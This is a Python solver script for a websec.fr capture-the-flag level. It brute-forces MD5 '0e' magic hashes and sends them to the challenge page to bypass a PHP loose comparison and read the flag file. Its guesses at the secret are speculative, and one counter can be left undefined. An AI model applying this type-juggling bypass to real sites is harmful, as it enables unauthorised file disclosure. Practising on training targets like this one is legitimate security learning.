#!/usr/bin/env python3
import requests
import hashlib
import itertools

url = "https://websec.fr/level10/index.php"

print("Búsqueda extendida - 3 caracteres")
print("="*60 + "\n")

tested_local = 0
found_0e_paths = []

# Caracteres más comunes
chars = "abcdefghijklmnopqrstuvwxyz0123456789._-"

print("Fase 1: Buscando paths que generen 0e localmente...\n", flush=True)

for combo in itertools.product(chars, repeat=3):
    path = ''.join(combo) + "flag.php"
    
    # Probar con flags MUY cortos
    for test_flag in ["", "W", "WE", "a", "x"]:
        test_str = test_flag + path + test_flag
        h = hashlib.md5(test_str.encode()).hexdigest()[:8]
        
        tested_local += 1
        
        if h[:2] == "0e" and h[2:].isdigit():
            found_0e_paths.append((path, test_flag, h))
            print(f"¡0e! path={path}, flag='{test_flag}', hash={h}", flush=True)
        
        if tested_local % 50000 == 0:
            print(f"  Probados localmente: {tested_local:,}, Encontrados: {len(found_0e_paths)}", flush=True)

print(f"\nFase 1 completada: {len(found_0e_paths)} paths encontrados\n", flush=True)

if not found_0e_paths:
    print("No se encontraron paths 0e. Probando enfoque diferente...", flush=True)
else:
    print("Fase 2: Probando paths encontrados online...\n", flush=True)
    
    tested_online = 0
    for path, _, _ in found_0e_paths:
        print(f"Probando {path}...", flush=True)
        
        # Probar con múltiples hashes 0e
        for i in range(200):
            hash_val = f"0e{i:06d}"
            
            try:
                r = requests.get(url, params={"f": path, "hash": hash_val}, timeout=3)
                tested_online += 1
                
                if "WEBSEC{" in r.text:
                    flag_start = r.text.find("WEBSEC{")
                    flag_end = r.text.find("}", flag_start)
                    flag = r.text[flag_start:flag_end+1]
                    
                    print(f"\n¡¡¡FLAG!!!!")
                    print(f"FLAG: {flag}")
                    print(f"Path: {path}")
                    print(f"Hash: {hash_val}")
                    
                    with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                        f.write(f"FLAG: {flag}\nPath: {path}\nHash: {hash_val}\n")
                    
                    exit(0)
            except:
                continue
        
        if tested_online % 100 == 0:
            print(f"  Online: {tested_online}", flush=True)

print(f"\nFinal: Local={tested_local:,}, Online={tested_online}, Paths 0e={len(found_0e_paths)}")